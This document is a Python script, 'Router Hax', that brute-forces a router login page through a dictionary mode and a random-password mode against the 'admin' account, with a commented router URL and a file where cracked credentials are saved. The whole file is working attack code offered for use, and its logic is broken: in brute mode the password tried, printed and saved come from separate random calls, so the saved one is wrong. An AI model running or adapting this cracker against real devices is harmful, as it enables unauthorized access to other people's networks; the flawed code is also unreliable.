import sys
import requests
import ctypes
from os import system
from colorama import Fore
import random
ctypes.windll.kernel32.SetConsoleTitleW("Router Hax")
try:
    arg = sys.argv[1]
except IndexError:
    print('no args passed, please read documentation')
    sys.exit()
def getpass(rangeval):
    return ''.join([random.choice(random.choice([['a','e','f','g','h','m','n','t','y'],['A','B','E','F','G','H','J','K','L','M','N','Q','R','T','X','Y'],['2','3','4','5','6','7','8','9'],['/','*','+','~','@','#','%','^','&']])) for i in range(rangeval)])
    

match arg:
    case '-dictionary':
         password_list = open('./data/dictionary/passwords.txt', 'r').read().splitlines()
         username_list = open('./data/dictionary/usernames.txt', 'r').read().splitlines()
         for user in username_list:
            for password in password_list:
                system('cls')
                print(f'\n[+] - Executing attack - [+]\n[+] - User: '+user+'  &  Password: '+password)
                # http://192.168.255.254/login.cgi
                response = requests.post('http://localhost', data='Username:{},Password:{}'.format(user, password))
                if (response.status_code == 204 or response.status_code == 404 or response.status_code == 500):
                    print('[+] - ' + Fore.RED + 'Incorrect Login' + Fore.RESET + " - [+]")
                if (response.status_code == 200):
                    print('[+] - ' + Fore.GREEN + 'Router PWND' + Fore.RESET + " - [+]")
                    f = open("./data/WOOOW.txt", "w")
                    f.write("Username: {} Password: {}".format(user,password))
                    f.close()
                    input()
    case '-brute':
        while True:
            system('cls')
            print(f'\n[+] - Executing attack - [+]\n[+] - User: admin  &  Password: '+getpass(8))
            # http://192.168.255.254/login.cgi
            response = requests.post('http://localhost', data='Username:admin,Password:{}'.format(getpass(8)))
            if (response.status_code == 204 or response.status_code == 404 or response.status_code == 500):
                print('[+] - ' + Fore.RED + 'Incorrect Login' + Fore.RESET + " - [+]")
            if (response.status_code == 200):
                print('[+] - ' + Fore.GREEN + 'Router PWND' + Fore.RESET + " - [+]")
                f = open("./data/WOOOW.txt", "w")
                f.write("Username: admin Password: {}".format(getpass(8)))
                f.close()
                input()
    case _:
        print('unknown args passed, please read documentation')
